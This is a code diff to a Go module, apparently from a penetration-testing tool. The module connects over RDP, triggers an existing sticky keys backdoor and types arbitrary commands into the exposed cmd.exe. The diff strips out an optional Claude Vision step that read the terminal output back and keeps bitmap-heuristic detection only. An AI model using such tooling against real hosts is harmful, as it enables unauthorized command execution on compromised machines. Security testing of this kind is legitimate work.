@@ -15,15 +15,12 @@
 package rdp
 
 import (
-	"bytes"
 	"context"
 	"fmt"
 	"image"
 	"image/png"
 	"os"
 	"time"
-
-	"github.com/praetorian-inc/brutus/internal/analyzers/claude"
 )
 
 // ExecResult holds the outcome of a sticky keys command execution.
@@ -31,14 +28,13 @@ type ExecResult struct {
 	BackdoorDetected bool
 	Command          string
 	ScreenshotPath   string // Path to PNG screenshot after command execution
-	Output           string // Terminal output text (populated when Vision API is enabled)
 	Error            string
 }
 
 // RunStickyKeysExec connects to an RDP target, triggers the sticky keys backdoor,
 // and if detected, types the specified command. Captures a screenshot of the result.
-// When apiKey is non-empty, the screenshot is sent to Claude Vision to extract terminal text.
-func RunStickyKeysExec(ctx context.Context, target, command string, timeout time.Duration, apiKey string) *ExecResult {
+// The command's on-screen output is not read back: detection is bitmap-heuristic only.
+func RunStickyKeysExec(ctx context.Context, target, command string, timeout time.Duration) *ExecResult {
 	result := &ExecResult{Command: command}
 
 	fmt.Fprintf(os.Stderr, "[*] Connecting to %s for sticky keys exploitation...\n", target)
@@ -89,10 +85,8 @@ func RunStickyKeysExec(ctx context.Context, target, command string, timeout time
 		return result
 	}
 
-	// Use dual-check analysis: heuristic first, then Vision API confirmation when available.
-	// This avoids false negatives from the heuristic alone (e.g. cmd.exe window not forming
-	// a dense enough rectangle for the fill-ratio check).
-	analysis := runStickyKeysAnalysis(ctx, baseline, response, sess.Width(), sess.Height(), apiKey)
+	// Bitmap dark-delta heuristic is the sole detection signal.
+	analysis := runStickyKeysAnalysis(baseline, response, sess.Width(), sess.Height())
 	if analysis.OverallVerdict == "clean" {
 		fmt.Fprintf(os.Stderr, "[!] No backdoor detected (heuristic: %s). Aborting.\n", analysis.HeuristicResult)
 		result.BackdoorDetected = false
@@ -102,9 +96,6 @@ func RunStickyKeysExec(ctx context.Context, target, command string, timeout time
 	result.BackdoorDetected = true
 	fmt.Fprintf(os.Stderr, "[+] Backdoor detected (%s, confidence: %.0f%%).\n",
 		analysis.OverallVerdict, analysis.Confidence*100)
-	if analysis.VisionResult != "" {
-		fmt.Fprintf(os.Stderr, "[+] Vision confirmation: %s\n", analysis.VisionResult)
-	}
 
 	// Maximize the cmd.exe window (Alt+Space → X) for better output visibility
 	fmt.Fprintf(os.Stderr, "[*] Maximizing terminal window...\n")
@@ -149,24 +140,6 @@ func RunStickyKeysExec(ctx context.Context, target, command string, timeout time
 	result.ScreenshotPath = screenshotPath
 	fmt.Fprintf(os.Stderr, "[+] Screenshot saved to %s\n", screenshotPath)
 
-	// Use Claude Vision to read terminal output if API key is provided
-	if apiKey != "" {
-		fmt.Fprintf(os.Stderr, "[*] Sending screenshot to Claude Vision for text extraction...\n")
-		pngData, pngErr := encodePNG(frame, sess.Width(), sess.Height())
-		if pngErr != nil {
-			fmt.Fprintf(os.Stderr, "[!] Vision: failed to encode PNG: %v\n", pngErr)
-			return result
-		}
-		client := &claude.Client{APIKey: apiKey}
-		output, visionErr := client.ReadTerminalOutput(ctx, pngData)
-		if visionErr != nil {
-			fmt.Fprintf(os.Stderr, "[!] Vision: %v\n", visionErr)
-			return result
-		}
-		result.Output = output
-		fmt.Fprintf(os.Stderr, "[+] Terminal output:\n%s\n", output)
-	}
-
 	return result
 }
 
@@ -186,22 +159,6 @@ func saveRGBAScreenshot(rgba []byte, width, height uint32, path string) error {
 	defer func() { _ = f.Close() }()
 
 	return png.Encode(f, img)
-}
-
-// encodePNG encodes RGBA framebuffer data to PNG bytes in memory.
-func encodePNG(rgba []byte, width, height uint32) ([]byte, error) {
-	img := image.NewRGBA(image.Rect(0, 0, int(width), int(height)))
-	expectedLen := int(width) * int(height) * 4
-	if len(rgba) < expectedLen {
-		return nil, fmt.Errorf("frame too small: got %d bytes, expected %d", len(rgba), expectedLen)
-	}
-	copy(img.Pix, rgba[:expectedLen])
-
-	var buf bytes.Buffer
-	if encErr := png.Encode(&buf, img); encErr != nil {
-		return nil, encErr
-	}
-	return buf.Bytes(), nil
 }
 
 // Scancodes for window maximize sequence (PS/2 Set 1).
